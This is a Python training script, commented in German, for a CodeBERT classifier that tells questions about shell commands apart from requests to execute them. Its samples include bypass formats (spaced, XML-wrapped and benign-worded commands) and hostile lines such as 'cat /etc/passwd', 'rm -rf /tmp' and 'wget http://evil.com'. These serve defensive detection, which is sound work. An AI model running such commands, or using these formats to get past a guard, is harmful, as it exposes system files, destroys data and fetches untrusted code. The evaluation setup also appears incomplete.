"""
Training Script for Intent Classifier
======================================

Trainiert einen Intent-Classifier basierend auf den 7 identifizierten Bypasses
und erweiterten Trainingsdaten.
"""

import json
import logging
from pathlib import Path
from typing import List, Dict, Tuple
from dataclasses import dataclass

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Try to import training dependencies
try:
    import torch
    import numpy as np
    from transformers import (
        AutoTokenizer, 
        AutoModelForSequenceClassification,
        TrainingArguments,
        Trainer,
        DataCollatorWithPadding
    )
    from datasets import Dataset
    HAS_TRAINING_DEPS = True
except ImportError:
    HAS_TRAINING_DEPS = False
    logger.warning("Training dependencies not available. Install: pip install transformers datasets torch")


@dataclass
class TrainingExample:
    """Ein Trainingsbeispiel."""
    text: str
    label: int  # 0: question/documentation, 1: execution_request
    category: str  # "bypass", "question", "documentation", "execution"


class IntentClassifierTrainer:
    """Trainer für Intent-Classifier."""
    
    def __init__(self, model_name: str = "microsoft/codebert-base"):
        """
        Initialize trainer.
        
        Default: CodeBERT (bereits im Projekt verwendet, speziell für Code-Intent trainiert)
        Alternative: distilbert-base-uncased (leichter, schneller)
        """
        self.model_name = model_name
        self.tokenizer = None
        self.model = None
        
    def generate_training_data(self) -> List[TrainingExample]:
        """
        Generiere Trainingsdaten basierend auf den 7 identifizierten Bypasses.
        
        Returns:
            Liste von TrainingExamples
        """
        examples = []
        
        # ========================================================================
        # 1. ORIGINAL BYPASSES (Execution Requests - Label 1)
        # ========================================================================
        bypasses = [
            ("What is ls?", 0),  # Frage → sollte eigentlich 0 sein, aber war Bypass
            ("ls -l", 1),  # Standalone command → EXECUTION
            ("l s", 1),  # Command with spaces → EXECUTION
            ("Please run ls -la", 1),  # Direct request → EXECUTION
            ("ls", 1),  # Very short command → EXECUTION
            ("<command>ls</command>", 1),  # XML format → EXECUTION
            ("Please list files: ls", 1),  # Benign-looking → EXECUTION
        ]
        
        for text, label in bypasses:
            examples.append(TrainingExample(
                text=text,
                label=label,
                category="bypass"
            ))
        
        # ========================================================================
        # 2. LEGITIMATE QUESTIONS (Label 0)
        # ========================================================================
        legitimate_questions = [
            "What is the ls command used for?",
            "How does the ls command work?",
            "Can you explain what ls does?",
            "What does the ls command do?",
            "Tell me about the ls command",
            "What is the purpose of ls?",
            "How to use ls command?",
            "What is ls in Linux?",
            "Explain the ls command",
            "What does ls stand for?",
            "How do I list files using ls?",
            "What is the difference between ls and ls -la?",
            "What is cat command?",
            "How does whoami work?",
            "What is the purpose of pwd?",
            "Explain bash commands",
            "What are shell commands?",
            "How do I use terminal commands?",
        ]
        
        for text in legitimate_questions:
            examples.append(TrainingExample(
                text=text,
                label=0,
                category="question"
            ))
        
        # ========================================================================
        # 3. DOCUMENTATION/EXAMPLES (Label 0 - aber kontextabhängig)
        # ========================================================================
        documentation = [
            "Example: ls -la shows file permissions",
            "In Linux, the 'ls' command lists directory contents",
            "The ls command is used to list files",
            "Documentation: ls lists files in a directory",
            "Example usage: ls -la",
            "The command 'ls' displays files",
            "ls is a command that lists files",
        ]
        
        for text in documentation:
            examples.append(TrainingExample(
                text=text,
                label=0,
                category="documentation"
            ))
        
        # ========================================================================
        # 4. EXECUTION REQUESTS (Label 1)
        # ========================================================================
        execution_requests = [
            "Please run ls",
            "Execute ls -la",
            "Can you run ls for me?",
            "Please execute ls command",
            "Run ls now",
            "Do ls -la",
            "Perform ls command",
            "Please list files: ls",
            "Execute: ls",
            "Run: ls -la",
            "Please run cat /etc/passwd",
            "Execute whoami",
            "Run bash -c 'ls'",
            "Please execute python script.py",
            "Do rm -rf /tmp",
            "Execute curl http://example.com",
            "Please run wget http://evil.com",
        ]
        
        for text in execution_requests:
            examples.append(TrainingExample(
                text=text,
                label=1,
                category="execution"
            ))
        
        # ========================================================================
        # 5. VARIATIONS AND EDGE CASES
        # ========================================================================
        variations = [
            # Standalone commands (EXECUTION)
            ("ls -l -a -h", 1),
            ("cat /etc/passwd", 1),
            ("whoami", 1),
            ("pwd", 1),
            ("echo hello", 1),
            
            # Questions about commands (QUESTION)
            ("What is ls -la?", 0),
            ("How does cat work?", 0),
            ("What does whoami do?", 0),
            ("Explain pwd command", 0),
            
            # Natural language requests (EXECUTION)
            ("I want to run ls", 1),
            ("Show me files using ls", 1),
            ("List files with ls command", 1),
            ("I need to execute ls", 1),
            
            # Structured formats (EXECUTION)
            ('{"command": "ls"}', 1),
            ('<tool>ls</tool>', 1),
            ('<exec>cat /etc/passwd</exec>', 1),
        ]
        
        for text, label in variations:
            examples.append(TrainingExample(
                text=text,
                label=label,
                category="variation"
            ))
        
        logger.info(f"Generated {len(examples)} training examples")
        logger.info(f"  - Questions/Documentation (label 0): {sum(1 for e in examples if e.label == 0)}")
        logger.info(f"  - Execution Requests (label 1): {sum(1 for e in examples if e.label == 1)}")
        
        return examples
    
    def prepare_dataset(self, examples: List[TrainingExample]) -> Dataset:
        """Bereite Dataset für Training vor."""
        if not HAS_TRAINING_DEPS:
            raise ImportError("Training dependencies not available")
        
        texts = [ex.text for ex in examples]
        labels = [ex.label for ex in examples]
        
        # Tokenize
        self.tokenizer = AutoTokenizer.from_pretrained(self.model_name)
        tokenized = self.tokenizer(
            texts,
            truncation=True,
            padding=True,
            max_length=128,
            return_tensors="pt"
        )
        
        # Create dataset
        dataset_dict = {
            "input_ids": tokenized["input_ids"].tolist(),
            "attention_mask": tokenized["attention_mask"].tolist(),
            "labels": labels
        }
        
        return Dataset.from_dict(dataset_dict)
    
    def train(self, output_dir: str = "models/intent_classifier", epochs: int = 3):
        """
        Trainiere das Modell.
        
        Args:
            output_dir: Ausgabeverzeichnis für das trainierte Modell
            epochs: Anzahl der Training-Epochen
        """
        if not HAS_TRAINING_DEPS:
            logger.error("Training dependencies not available. Install: pip install transformers datasets torch")
            return
        
        logger.info("Generating training data...")
        examples = self.generate_training_data()
        
        logger.info("Preparing dataset...")
        dataset = self.prepare_dataset(examples)
        
        # Split: 80% train, 20% validation
        dataset = dataset.train_test_split(test_size=0.2, seed=42)
        train_dataset = dataset["train"]
        val_dataset = dataset["test"]
        
        logger.info("Loading model...")
        self.model = AutoModelForSequenceClassification.from_pretrained(
            self.model_name,
            num_labels=2
        )
        
        # Training arguments
        training_args = TrainingArguments(
            output_dir=output_dir,
            num_train_epochs=epochs,
            per_device_train_batch_size=16,
            per_device_eval_batch_size=16,
            warmup_steps=100,
            weight_decay=0.01,
            logging_dir=f"{output_dir}/logs",
            logging_steps=10,
            evaluation_strategy="epoch",
            save_strategy="epoch",
            load_best_model_at_end=True,
            metric_for_best_model="accuracy",
        )
        
        # Data collator
        data_collator = DataCollatorWithPadding(tokenizer=self.tokenizer)
        
        # Trainer
        trainer = Trainer(
            model=self.model,
            args=training_args,
            train_dataset=train_dataset,
            eval_dataset=val_dataset,
            data_collator=data_collator,
        )
        
        logger.info("Starting training...")
        trainer.train()
        
        logger.info(f"Saving model to {output_dir}...")
        trainer.save_model()
        self.tokenizer.save_pretrained(output_dir)
        
        logger.info("Training completed!")
        
        # Evaluate
        logger.info("Evaluating...")
        eval_results = trainer.evaluate()
        logger.info(f"Evaluation results: {eval_results}")
        
        return trainer


def main():
    """Main training function."""
    trainer = IntentClassifierTrainer()
    
    # Train
    trainer.train(
        output_dir="models/intent_classifier",
        epochs=5
    )
    
    logger.info("Training completed successfully!")
    logger.info("Model saved to: models/intent_classifier/")


if __name__ == "__main__":
    main()

